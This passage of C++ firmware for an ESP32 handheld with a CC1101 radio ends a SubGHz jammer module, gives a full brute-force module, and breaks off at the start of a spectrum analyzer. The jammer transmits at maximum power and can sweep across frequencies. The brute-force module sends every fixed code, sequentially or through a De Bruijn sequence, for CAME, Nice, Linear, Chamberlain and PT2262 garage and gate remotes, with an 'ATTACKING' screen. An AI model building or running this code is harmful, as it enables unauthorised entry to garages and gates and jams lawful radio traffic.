// ═══════════════════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    exitRequested = false;
    jamming = false;
    skullFrame = 0;
    freqChanged = false;
    sjTaskHandle = NULL;
    sjTaskRunning = false;
    memset(channelHeat, 0, sizeof(channelHeat));

    #if CYD_DEBUG
    Serial.println("[JAMMER] Initializing SubGHz Jammer...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus so ELECHOUSE can configure fresh
    SPI.end();
    delay(5);

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);
    #ifdef NMRF_HAT
    pinMode(CC1101_GDO0, OUTPUT);  // Hat: GDO_Set() leaves as INPUT when GDO0==GDO2
    #endif

    // Initialize CC1101
    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK
        ELECHOUSE_cc1101.setRxBW(500.0);
        ELECHOUSE_cc1101.setPA(12);         // Max power
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);

        #if CYD_DEBUG
        Serial.println("[JAMMER] CC1101 initialized");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[JAMMER] CC1101 not found!");
        #endif
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setTextSize(2);
        drawCenteredText(100, "CC1101 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, "CS=27 GDO0=22 GDO2=35", HALEHOUND_MAGENTA, 1);
        initialized = false;
        return;
    }

    // Draw full UI
    drawHeader();
    drawJammerDisplay();
    drawSkulls();

    lastDisplayTime = millis();
    initialized = true;
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN LOOP
// ═══════════════════════════════════════════════════════════════════════════

void loop() {
    if (!initialized) {
        // CC1101 not found - just check for exit
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - with release detection (prevents repeat triggers)
    // Icons: Back=10, Toggle=60, Prev=105, Next=140, Sweep=180, Mode=215
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area (y=20-40)
        if (ty >= 20 && ty <= 40) {
            // Wait for touch release to prevent repeated triggers
            while (isTouched()) { delay(10); }

            // Back icon (x=10)
            if (tx >= 5 && tx <= 30) {
                if (jamming) stop();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=60)
            else if (tx >= 50 && tx <= 80) {
                toggle();
                drawIconBar();
                drawHeader();
                return;
            }
            // Prev freq icon (x=105)
            else if (tx >= 95 && tx <= 125) {
                if (!autoSweep) {
                    prevFrequency();
                    drawHeader();
                }
                return;
            }
            // Next freq icon (x=140)
            else if (tx >= 130 && tx <= 160) {
                if (!autoSweep) {
                    nextFrequency();
                    drawHeader();
                }
                return;
            }
            // Sweep icon (x=180)
            else if (tx >= 170 && tx <= 200) {
                toggleAutoSweep();
                drawIconBar();
                drawHeader();
                return;
            }
            // Mode icon at right edge
            else if (tx >= (tft.width() - 35) && tx <= tft.width()) {
                toggleContinuousMode();
                drawHeader();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (jamming) stop();
        exitRequested = true;
        return;
    }

    // Jam engine runs on Core 0 (sjJamTask)
    // Frequency sweep + TX all handled by Core 0

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE (throttled at ~12fps for smooth equalizer animation)
    // ═══════════════════════════════════════════════════════════════════════
    if (millis() - lastDisplayTime >= 80) {
        drawJammerDisplay();
        drawSkulls();
        lastDisplayTime = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// CONTROL FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void start() {
    if (!jamming) {
        // CC1101 init before task launch — sequential, no contention
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
        ELECHOUSE_cc1101.SetTx();
        lastSweepTime = millis();
        jamming = true;

        startJamTask();  // Launch Core 0 TX engine

        #if CYD_DEBUG
        Serial.printf("[JAMMER] Started on %.3f MHz (Core 0)\n", frequencyListMHz[currentFreqIndex]);
        #endif
    }
}

void stop() {
    if (jamming) {
        stopJamTask();  // Kill Core 0 task first

        // CC1101 cleanup — task is dead, safe to access from Core 1
        ELECHOUSE_cc1101.setSidle();
        digitalWrite(CC1101_GDO0, LOW);

        #if CYD_DEBUG
        Serial.println("[JAMMER] Stopped");
        #endif
    }
}

void toggle() {
    if (jamming) {
        stop();
    } else {
        start();
    }
}

bool isJamming() {
    return jamming;
}

void setFrequency(float mhz) {
    // Find closest frequency in list
    for (int i = 0; i < frequencyCount; i++) {
        if (abs(frequencyListMHz[i] - mhz) < 0.01) {
            currentFreqIndex = i;
            break;
        }
    }
    if (jamming) {
        freqChanged = true;  // Core 0 task will retune CC1101
    } else {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
    }
}

float getFrequency() {
    return frequencyListMHz[currentFreqIndex];
}

void nextFrequency() {
    currentFreqIndex = (currentFreqIndex + 1) % frequencyCount;
    if (jamming) {
        freqChanged = true;  // Core 0 task will retune CC1101
    } else {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
    }
}

void prevFrequency() {
    currentFreqIndex = (currentFreqIndex - 1 + frequencyCount) % frequencyCount;
    if (jamming) {
        freqChanged = true;  // Core 0 task will retune CC1101
    } else {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[currentFreqIndex]);
    }
}

void toggleAutoSweep() {
    autoSweep = !autoSweep;
    if (autoSweep) {
        lastSweepTime = millis();
    }

    #if CYD_DEBUG
    Serial.println("[JAMMER] Auto-sweep: " + String(autoSweep ? "ON" : "OFF"));
    #endif
}

bool isAutoSweep() {
    return autoSweep;
}

void toggleContinuousMode() {
    continuousMode = !continuousMode;

    #if CYD_DEBUG
    Serial.println("[JAMMER] Mode: " + String(continuousMode ? "Carrier" : "Noise"));
    #endif
}

bool isContinuousMode() {
    return continuousMode;
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (jamming) {
        stop();  // Kills Core 0 task + CC1101 cleanup
    }
    stopJamTask();  // Belt and suspenders — ensure task is dead
    ELECHOUSE_cc1101.setSidle();
    spiDeselect();

    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[JAMMER] Cleanup complete");
    #endif
}

}  // namespace SubJammer



// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ BRUTE FORCE IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace SubBrute {

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════
#define SB_ICON_SIZE 16
#define SB_ICON_NUM 5
static int sbIconX[SB_ICON_NUM] = {50, 90, 130, 170, 10};
static const unsigned char* sbIcons[SB_ICON_NUM] = {
    bitmap_icon_power,             // 0: Start/Stop
    bitmap_icon_sort_down_minus,   // 1: Prev protocol
    bitmap_icon_sort_up_plus,      // 2: Next protocol
    bitmap_icon_random,            // 3: Toggle De Bruijn
    bitmap_icon_go_back            // 4: Back
};

static void drawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    for (int i = 0; i < SB_ICON_NUM; i++) {
        tft.drawBitmap(sbIconX[i], 20, sbIcons[i], SB_ICON_SIZE, SB_ICON_SIZE, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// PROTOCOL DEFINITIONS - 21 protocols covering ALL SubGHz frequencies
// 3 repetitions for stronger signal while maintaining touch responsiveness
// ═══════════════════════════════════════════════════════════════════════════
struct ProtocolDef {
    const char* name;
    uint32_t frequency;     // Hz
    uint8_t bitLength;
    uint16_t shortPulse;    // T
    uint16_t longPulse;     // 2T or 3T
    uint16_t pilotHigh;
    uint16_t pilotLow;
    uint16_t interCodeDelay;
    uint8_t repetitions;
};

// 1 rep for responsive touch - brute force sends ALL codes anyway
static const ProtocolDef protocols[PROTO_COUNT] = {
    // CAME 12-bit: T=320us
    {"CAME 433",   433920000, 12, 320, 640, 320, 9600, 100, 1},
    {"CAME 315",   315000000, 12, 320, 640, 320, 9600, 100, 1},
    // Nice FLO 12-bit: T=700us
    {"NICE 433",   433920000, 12, 700, 1400, 700, 25200, 100, 1},
    {"NICE 315",   315000000, 12, 700, 1400, 700, 25200, 100, 1},
    // Linear 10-bit: T=500us
    {"LINEAR 300", 300000000, 10, 500, 1000, 500, 18000, 100, 1},
    {"LINEAR 310", 310000000, 10, 500, 1000, 500, 18000, 100, 1},
    // Chamberlain 9-bit: T=500us
    {"CHAMBERLN",  300000000,  9, 500, 1500, 500, 39000, 100, 1},
    // PT2262/EV1527 12-bit: T=350us - covers ALL common frequencies
    {"PT2262 300", 300000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 303", 303875000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 304", 304250000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 310", 310000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 315", 315000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 318", 318000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 390", 390000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 418", 418000000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 433", 433920000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 434", 434420000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 438", 438900000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 868", 868350000, 12, 350, 1050, 350, 10850, 100, 1},
    {"PT2262 915", 915000000, 12, 350, 1050, 350, 10850, 100, 1}
};

// ═══════════════════════════════════════════════════════════════════════════
// SIMPLE TX INDICATOR - No complex animation, just shows activity
// ═══════════════════════════════════════════════════════════════════════════
#define EQ_Y            200  // Where the TX indicator area starts

static unsigned long lastEqUpdate = 0;
static int txPulse = 0;

static void drawEqualizer() {
    // Simple TX activity bar at bottom
    tft.fillRect(10, EQ_Y, 220, 20, HALEHOUND_BLACK);
    tft.drawRoundRect(10, EQ_Y, 220, 20, 4, HALEHOUND_MAGENTA);

    if (txPulse > 0) {
        int barW = min(txPulse * 2, 216);
        for (int i = 0; i < barW; i++) {
            float ratio = (float)i / 216.0f;
            // Inline gradient: cyan to hot pink
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 255 - (uint8_t)(ratio * (255 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 132));
            uint16_t color = tft.color565(r, g, b);
            tft.drawFastVLine(12 + i, EQ_Y + 2, 16, color);
        }
    }
}

static void updateEqualizer() {
    if (millis() - lastEqUpdate < 50) return;
    lastEqUpdate = millis();

    // Decay
    if (txPulse > 0) txPulse -= 5;
    if (txPulse < 0) txPulse = 0;

    drawEqualizer();
}

static void pulseEqualizer(int intensity) {
    txPulse = min(txPulse + intensity, 108);
}

// State variables
static bool initialized = false;
static bool exitRequested = false;
static bool running = false;
static bool paused = false;
static bool useDeBruijn = true;
static int currentProtocol = PROTO_CAME_433;
static uint32_t currentCode = 0;
static uint32_t startCode = 0;
static uint32_t endCode = 0;
static uint32_t deBruijnBit = 0;
static uint32_t deBruijnLength = 0;
static unsigned long startTime = 0;
static unsigned long lastDisplayUpdate = 0;
static unsigned long lastDebounce = 0;
#define DEBOUNCE_MS 200

// De Bruijn generator state
static uint8_t* deBruijnA = nullptr;
static int deBruijnN = 0;
static int deBruijnT = 0;
static int deBruijnP = 0;
static int deBruijnOutputIdx = 0;
static bool deBruijnHasMore = true;

// RCSwitch for transmission
static RCSwitch bruteSwitch;

// Initialize De Bruijn generator
static void initDeBruijn(int n) {
    if (deBruijnA) {
        delete[] deBruijnA;
        deBruijnA = nullptr;
    }
    deBruijnN = n;
    deBruijnA = new (std::nothrow) uint8_t[n + 1]();

    if (deBruijnA == nullptr) {
        deBruijnHasMore = false;
        return;
    }

    deBruijnT = 1;
    deBruijnP = 1;
    deBruijnOutputIdx = 1;
    deBruijnHasMore = true;
    deBruijnLength = (1UL << n);
    deBruijnBit = 0;
}

static void cleanupDeBruijn() {
    if (deBruijnA) {
        delete[] deBruijnA;
        deBruijnA = nullptr;
    }
    deBruijnHasMore = false;
}

static int nextDeBruijnBit() {
    while (deBruijnHasMore) {
        if (deBruijnT > deBruijnN) {
            if (deBruijnN % deBruijnP == 0) {
                if (deBruijnOutputIdx <= deBruijnP) {
                    return deBruijnA[deBruijnOutputIdx++];
                }
                deBruijnOutputIdx = 1;
            }
            do {
                deBruijnT--;
                if (deBruijnT == 0) {
                    deBruijnHasMore = false;
                    return -1;
                }
            } while (deBruijnA[deBruijnT] == 1);

            deBruijnA[deBruijnT]++;
            deBruijnP = deBruijnT;
            deBruijnT++;
        } else {
            deBruijnA[deBruijnT] = deBruijnA[deBruijnT - deBruijnP];
            deBruijnT++;
        }
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROTOKILL-STYLE UI - Big fonts, gradients, animated status
// ═══════════════════════════════════════════════════════════════════════════

// Helper to draw centered FreeFont text
static void drawCenteredFreeFont(int y, const char* text, uint16_t color, const GFXfont* font) {
    tft.setFreeFont(font);
    tft.setTextColor(color, TFT_BLACK);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;
    tft.setCursor(x, y);
    tft.print(text);
    tft.setFreeFont(NULL);
}

// Generate gradient color from cyan to hot pink
static uint16_t getGradientColor(float ratio) {
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 255 - (uint8_t)(ratio * (255 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 132));
    return tft.color565(r, g, b);
}

// Draw gradient progress bar
static void drawGradientProgressBar(int x, int y, int w, int h, float progress) {
    // Border
    tft.drawRoundRect(x - 1, y - 1, w + 2, h + 2, 3, HALEHOUND_MAGENTA);

    // Background
    tft.fillRoundRect(x, y, w, h, 2, HALEHOUND_DARK);

    // Fill with gradient
    int fillW = (int)(progress * w / 100.0);
    if (fillW > 0) {
        for (int i = 0; i < fillW; i++) {
            float ratio = (float)i / (float)w;
            uint16_t color = getGradientColor(ratio);
            tft.drawFastVLine(x + i, y + 1, h - 2, color);
        }
    }

    // Percentage text
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.setTextSize(1);
    char buf[8];
    snprintf(buf, sizeof(buf), "%.1f%%", progress);
    int tw = strlen(buf) * 6;
    tft.setCursor(x + (w - tw) / 2, y + (h - 8) / 2);
    tft.print(buf);
}

static void drawMainUI() {
    const ProtocolDef& proto = protocols[currentProtocol];

    // Clear main area (below icon bar, above equalizer)
    tft.fillRect(0, 38, SCREEN_WIDTH, EQ_Y - 38, TFT_BLACK);

    // Glitch title - chromatic aberration effect
    drawGlitchText(55, "BRUTE FORCE", &Nosifer_Regular10pt7b);
    tft.drawLine(0, 58, SCREEN_WIDTH, 58, HALEHOUND_HOTPINK);

    // Protocol frame with rounded corners
    tft.drawRoundRect(10, 60, 220, 55, 8, HALEHOUND_VIOLET);
    tft.drawRoundRect(11, 61, 218, 53, 7, HALEHOUND_GUNMETAL);

    // Protocol name - big and centered
    tft.fillRect(15, 65, 210, 22, TFT_BLACK);
    drawCenteredFreeFont(84, proto.name, HALEHOUND_MAGENTA, &FreeMonoBold12pt7b);

    // Frequency below protocol name
    char freqBuf[16];
    snprintf(freqBuf, sizeof(freqBuf), "%.3f MHz", proto.frequency / 1000000.0);
    tft.fillRect(15, 90, 210, 20, TFT_BLACK);
    drawCenteredFreeFont(105, freqBuf, HALEHOUND_BRIGHT, &FreeMono9pt7b);

    // Mode indicator
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setCursor(15, 120);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.print("Mode: ");
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.print(useDeBruijn ? "DE BRUIJN" : "SEQUENTIAL");

    // Bits info
    tft.setCursor(140, 120);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.print("Bits: ");
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.print(proto.bitLength);
}

static void updateDisplay() {
    if (millis() - lastDisplayUpdate < 100) return;
    lastDisplayUpdate = millis();

    const ProtocolDef& proto = protocols[currentProtocol];

    // Calculate progress
    float progress = 0;
    if (running) {
        uint32_t total = endCode - startCode + 1;
        uint32_t done = currentCode - startCode;
        progress = (total > 0) ? (done * 100.0 / total) : 0;
    }

    // Status area (below protocol frame)
    tft.fillRect(0, 135, SCREEN_WIDTH, 60, TFT_BLACK);

    // Status text with pulsing effect when attacking
    static bool statusBlink = false;
    statusBlink = !statusBlink;

    if (running) {
        if (paused) {
            drawCenteredFreeFont(155, "PAUSED", HALEHOUND_VIOLET, &FreeMonoBold12pt7b);
        } else {
            uint16_t statusColor = statusBlink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
            drawCenteredFreeFont(155, "ATTACKING", statusColor, &FreeMonoBold12pt7b);
        }

        // Progress bar
        drawGradientProgressBar(15, 165, 210, 16, progress);

        // Stats line
        tft.setFreeFont(NULL);
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(15, 185);
        tft.printf("Code: %lu/%lu", currentCode, endCode);

        // Time elapsed
        unsigned long elapsed = (millis() - startTime) / 1000;
        tft.setCursor(160, 185);
        tft.printf("Time: %lu:%02lu", elapsed / 60, elapsed % 60);

    } else {
        drawCenteredFreeFont(155, "READY", HALEHOUND_BRIGHT, &FreeMonoBold12pt7b);
        tft.setFreeFont(NULL);
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.setCursor(55, 175);
        tft.print("TAP TO START ATTACK");
    }
    // Equalizer is updated in main loop()
}

// Transmit a complete code using RCSwitch
static void transmitCode(uint32_t code, const ProtocolDef& proto) {
    bruteSwitch.setProtocol(1);
    bruteSwitch.setPulseLength(proto.shortPulse);

    for (int rep = 0; rep < proto.repetitions; rep++) {
        bruteSwitch.send(code, proto.bitLength);
        delayMicroseconds(proto.interCodeDelay);
        if (!running) break;
        yield();
    }
}

// Run sequential brute force
static void runSequentialBrute(const ProtocolDef& proto) {
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);
    ELECHOUSE_cc1101.SetTx();

    bruteSwitch.enableTransmit(CC1101_GDO0);

    while (currentCode <= endCode && running) {
        if (paused) {
            delay(50);
            touchButtonsUpdate();
            if (buttonPressed(BTN_DOWN)) {
                paused = false;
                delay(200);
            }
            // Direct GPIO read for BOOT - always works
            if (digitalRead(0) == LOW || isBackButtonTapped()) {
                running = false;
                break;
            }
            continue;
        }

        transmitCode(currentCode, proto);
        currentCode++;

        // HARD STOP - Direct GPIO0 read (BOOT button)
        if (digitalRead(0) == LOW) {
            running = false;
            break;
        }

        // Touch stop - check every iteration
        if (isBackButtonTapped()) {
            running = false;
            break;
        }

        // Update display every 32 codes
        if ((currentCode & 0x1F) == 0) {
            updateDisplay();
            yield();
        }
    }

    bruteSwitch.disableTransmit();
    ELECHOUSE_cc1101.setSidle();
}

// Run De Bruijn optimized brute force
static void runDeBruijnBrute(const ProtocolDef& proto) {
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);
    ELECHOUSE_cc1101.SetTx();

    bruteSwitch.enableTransmit(CC1101_GDO0);

    initDeBruijn(proto.bitLength);
    if (!deBruijnHasMore) {
        ELECHOUSE_cc1101.setSidle();
        return;
    }

    int bit;
    uint32_t currentWord = 0;
    int bitsCollected = 0;

    while ((bit = nextDeBruijnBit()) >= 0 && running) {
        if (paused) {
            delay(50);
            touchButtonsUpdate();
            if (buttonPressed(BTN_DOWN)) {
                paused = false;
                delay(200);
            }
            // Direct GPIO read for BOOT - always works
            if (digitalRead(0) == LOW || isBackButtonTapped()) {
                running = false;
                break;
            }
            continue;
        }

        // Build up bits into code words
        currentWord = ((currentWord << 1) | bit) & ((1UL << proto.bitLength) - 1);
        bitsCollected++;
        deBruijnBit++;

        // Once we have enough bits, transmit the code
        if (bitsCollected >= proto.bitLength) {
            transmitCode(currentWord, proto);

            // HARD STOP - Direct GPIO0 read (BOOT button)
            if (digitalRead(0) == LOW) {
                running = false;
                break;
            }

            // Touch stop
            if (isBackButtonTapped()) {
                running = false;
                break;
            }

            // Update display every 32 codes
            if ((deBruijnBit & 0x1F) == 0) {
                updateDisplay();
                yield();
            }
        }
    }

    cleanupDeBruijn();
    bruteSwitch.disableTransmit();
    ELECHOUSE_cc1101.setSidle();
}

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BRUTE] Initializing SubGHz Brute Force...");
    #endif

    // Initialize TX indicator
    txPulse = 0;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus so ELECHOUSE can configure fresh
    SPI.end();
    delay(5);

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    // Initialize CC1101
    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(2);
        ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
        ELECHOUSE_cc1101.setPA(12);  // Max power

        #if CYD_DEBUG
        Serial.println("[BRUTE] CC1101 initialized at max power");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[BRUTE] CC1101 not found!");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        delay(2000);
    }

    // Reset state
    running = false;
    paused = false;
    currentCode = 0;
    exitRequested = false;

    cleanupDeBruijn();

    // Draw the new ProtoKill-style UI
    drawMainUI();
    drawEqualizer();
    updateDisplay();

    initialized = true;
}

void loop() {
    if (!initialized) return;

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - Match actual icon positions
    // Icons: Back=10, Power=50, Down=90, Up=130, Random=170
    // ═══════════════════════════════════════════════════════════════════════
    touchButtonsUpdate();

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area (Y = 20-40)
        if (ty >= 20 && ty <= 40) {
            // Back icon (x=10, zone 0-35)
            if (tx < 35) {
                running = false;
                stopAttack();
                exitRequested = true;
                return;
            }
            // Power/Toggle icon (x=50, zone 35-75)
            if (tx >= 35 && tx < 75) {
                if (running) {
                    stopAttack();
                } else {
                    startAttack();
                }
                while (isTouched()) { delay(10); }
            }
            // Down/Prev protocol (x=90, zone 75-115)
            if (tx >= 75 && tx < 115 && !running) {
                prevProtocol();
                while (isTouched()) { delay(10); }
            }
            // Up/Next protocol (x=130, zone 115-155)
            if (tx >= 115 && tx < 155 && !running) {
                nextProtocol();
                while (isTouched()) { delay(10); }
            }
            // Random/Toggle De Bruijn (x=170, zone 155+)
            if (tx >= 155 && !running) {
                toggleDeBruijn();
                while (isTouched()) { delay(10); }
            }
        }
        // Center screen tap = toggle attack
        if (ty > 60 && ty < 160) {
            if (running) {
                stopAttack();
            } else {
                startAttack();
            }
            while (isTouched()) { delay(10); }
        }
    }

    // Hardware button handling
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        running = false;
        stopAttack();
        exitRequested = true;
        return;
    }

    if (buttonPressed(BTN_LEFT) && !running) {
        prevProtocol();
    }
    if (buttonPressed(BTN_RIGHT) && !running) {
        nextProtocol();
    }
    if (buttonPressed(BTN_UP) && !running) {
        toggleDeBruijn();
    }
    if (buttonPressed(BTN_SELECT)) {
        if (running) stopAttack();
        else startAttack();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ATTACK LOGIC - one code per loop, fast return to touch handling
    // ═══════════════════════════════════════════════════════════════════════
    if (running && !paused) {
        const ProtocolDef& proto = protocols[currentProtocol];

        // Pulse equalizer BEFORE transmit so it shows activity
        pulseEqualizer(40);

        transmitCode(currentCode, proto);

        // *** CRITICAL: Check touch IMMEDIATELY after transmit ***
        uint16_t tx2, ty2;
        if (getTouchPoint(&tx2, &ty2)) {
            stopAttack();
            while (isTouched()) { delay(10); }
            return;
        }

        if (!running) return;

        currentCode++;

        if (currentCode > endCode) {
            stopAttack();
        }

        // Update status display every 32 codes
        if ((currentCode & 0x1F) == 0) {
            updateDisplay();
        }
    }

    // Update TX indicator
    updateEqualizer();
}

void startAttack() {
    if (running) return;

    const ProtocolDef& proto = protocols[currentProtocol];

    // Initialize state
    startCode = 0;
    endCode = (1UL << proto.bitLength) - 1;
    currentCode = startCode;
    startTime = millis();
    running = true;
    paused = false;

    // Configure CC1101 for TX
    ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);  // Max power
    ELECHOUSE_cc1101.SetTx();

    // Enable RCSwitch TX
    bruteSwitch.enableTransmit(CC1101_GDO0);

    #if CYD_DEBUG
    Serial.println("[BRUTE] Starting: " + String(proto.name) + " @ " +
                   String(proto.frequency / 1000000.0, 2) + " MHz");
    #endif

    updateDisplay();
    // Attack runs in loop() - non-blocking!
}

void stopAttack() {
    running = false;
    paused = false;

    // Cleanup TX
    bruteSwitch.disableTransmit();
    ELECHOUSE_cc1101.setSidle();

    #if CYD_DEBUG
    Serial.println("[BRUTE] Stopped at code " + String(currentCode));
    #endif

    updateDisplay();
}

void togglePause() {
    if (running) {
        paused = !paused;
        updateDisplay();
    }
}

bool isRunning() {
    return running;
}

bool isPaused() {
    return paused;
}

void setProtocol(int proto) {
    if (proto >= 0 && proto < PROTO_COUNT) {
        currentProtocol = proto;
        ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
        updateDisplay();
    }
}

int getProtocol() {
    return currentProtocol;
}

void nextProtocol() {
    currentProtocol = (currentProtocol + 1) % PROTO_COUNT;
    ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
    drawMainUI();  // Redraw protocol frame
    updateDisplay();
}

void prevProtocol() {
    currentProtocol = (currentProtocol - 1 + PROTO_COUNT) % PROTO_COUNT;
    ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
    drawMainUI();  // Redraw protocol frame
    updateDisplay();
}

const char* getProtocolName(int proto) {
    if (proto >= 0 && proto < PROTO_COUNT) {
        return protocols[proto].name;
    }
    return "Unknown";
}

void toggleDeBruijn() {
    useDeBruijn = !useDeBruijn;

    #if CYD_DEBUG
    Serial.println("[BRUTE] Mode: " + String(useDeBruijn ? "De Bruijn" : "Sequential"));
    #endif

    drawMainUI();  // Redraw to show mode change
    updateDisplay();
}

bool isDeBruijn() {
    return useDeBruijn;
}

float getProgress() {
    const ProtocolDef& proto = protocols[currentProtocol];

    if (useDeBruijn && running) {
        uint32_t totalBits = deBruijnLength + proto.bitLength - 1;
        return (totalBits > 0) ? (deBruijnBit * 100.0 / totalBits) : 0;
    } else if (running) {
        uint32_t total = endCode - startCode + 1;
        uint32_t done = currentCode - startCode;
        return (total > 0) ? (done * 100.0 / total) : 0;
    }
    return 0;
}

uint32_t getCurrentCode() {
    return currentCode;
}

uint32_t getMaxCode() {
    return (1UL << protocols[currentProtocol].bitLength) - 1;
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (running) {
        stopAttack();
    }
    cleanupDeBruijn();
    ELECHOUSE_cc1101.setSidle();
    spiDeselect();

    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[BRUTE] Cleanup complete");
    #endif
}

}  // namespace SubBrute


// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ SPECTRUM ANALYZER IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace SubAnalyzer {

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR — MATCHES HALEHOUND STANDARD
// ═══════════════════════════════════════════════════════════════════════════

#define SA_ICON_SIZE 16
